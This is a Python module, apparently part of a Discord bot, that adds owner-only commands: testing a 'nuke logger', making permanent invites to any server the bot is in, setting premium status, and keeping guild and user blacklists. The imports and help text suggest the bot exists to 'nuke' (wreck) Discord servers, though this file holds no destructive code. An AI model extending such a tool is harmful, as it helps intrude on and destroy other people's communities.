import discord
from discord.ext import commands
from core.config import OWNER_IDS
from core.managers.nukelogger import log_nuke
from core.managers.usertypes import set_premium, remove_premium
from core.managers.checks import is_owner
from core.managers.usertypes import _db


class Owner(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(name="testlog", help="Test the nuke logger without nuking (owners only)")
    @is_owner()
    async def testlog(self, ctx: commands.Context):
        await log_nuke(ctx)
        await ctx.send("Test log sent.")

    @commands.command(name="invite", help="Create an invite for a guild (owner only)")
    @is_owner()
    async def invite(self, ctx: commands.Context, guild_id: int):
        guild = self.bot.get_guild(guild_id)
        if not guild:
            await ctx.send("Guild not found.")
            return

        channel = guild.text_channels[0] if guild.text_channels else None
        if not channel:
            await ctx.send("No text channels in that guild.")
            return

        try:
            invite = await channel.create_invite(max_age=0, max_uses=0)
            await ctx.send(f"Invite created: {invite.url}")
        except Exception as e:
            await ctx.send(f"Failed to create invite: {e}")

    @commands.command(name="set_premium", help="Set premium status for a user (owner only)")
    @is_owner()
    async def set_premium(self, ctx: commands.Context, user_id: int, duration_seconds: int):
        set_premium(user_id, duration_seconds)
        await ctx.send(f"Set premium for user {user_id} for {duration_seconds} seconds.")

    @commands.command(name="remove_premium", help="Remove premium status from a user (owner only)")
    @is_owner()
    async def remove_premium(self, ctx: commands.Context, user_id: int):
        remove_premium(user_id)
        await ctx.send(f"Removed premium from user {user_id}.")

    @commands.group(name="blacklist", help="Manage blacklists", hidden=True)
    @is_owner()
    async def blacklist(self, ctx: commands.Context):
        if ctx.invoked_subcommand is None:
            await ctx.send("Usage: !blacklist <guild|member> <set|remove|list>")

    @blacklist.group(name="guild", invoke_without_command=True)
    @is_owner()
    async def guild_group(self, ctx: commands.Context):
        await ctx.send("Usage: !blacklist guild <set|remove|list>")

    @guild_group.command(name="set")
    @is_owner()
    async def guild_set(self, ctx: commands.Context, guild_id: int):
        if _db.is_guild_blacklisted(guild_id):
            await ctx.send(f"Guild {guild_id} is already blacklisted.")
            return
        await _db.add_guild(guild_id)
        await ctx.send(f"Added guild {guild_id} to blacklist.")

    @guild_group.command(name="remove")
    @is_owner()
    async def guild_remove(self, ctx: commands.Context, guild_id: int):
        if not _db.is_guild_blacklisted(guild_id):
            await ctx.send(f"Guild {guild_id} is not blacklisted.")
            return
        await _db.remove_guild(guild_id)
        await ctx.send(f"Removed guild {guild_id} from blacklist.")

    @guild_group.command(name="list")
    @is_owner()
    async def guild_list(self, ctx: commands.Context):
        if not _db._blacklist:
            await ctx.send("No blacklisted guilds.")
            return
        await ctx.send("Blacklisted guilds:\n" + "\n".join(str(g) for g in _db._blacklist))

    @blacklist.group(name="member", invoke_without_command=True)
    @is_owner()
    async def member_group(self, ctx: commands.Context):
        await ctx.send("Usage: !blacklist member <set|remove|list>")

    @member_group.command(name="set")
    @is_owner()
    async def member_set(self, ctx: commands.Context, user_id: int):
        if _db.is_user_blacklisted(user_id):
            await ctx.send(f"User {user_id} is already blacklisted.")
            return
        await _db.add_user(user_id)
        await ctx.send(f"Added user {user_id} to blacklist.")

    @member_group.command(name="remove")
    @is_owner()
    async def member_remove(self, ctx: commands.Context, user_id: int):
        if not _db.is_user_blacklisted(user_id):
            await ctx.send(f"User {user_id} is not blacklisted.")
            return
        await _db.remove_user(user_id)
        await ctx.send(f"Removed user {user_id} from blacklist.")

    @member_group.command(name="list")
    @is_owner()
    async def member_list(self, ctx: commands.Context):
        if not _db._user_blacklist:
            await ctx.send("No blacklisted users.")
            return
        await ctx.send("Blacklisted users:\n" + "\n".join(str(u) for u in _db._user_blacklist))


async def setup(bot):
    await bot.add_cog(Owner(bot))


def teardown(bot):
    bot.remove_cog(Owner.__name__)
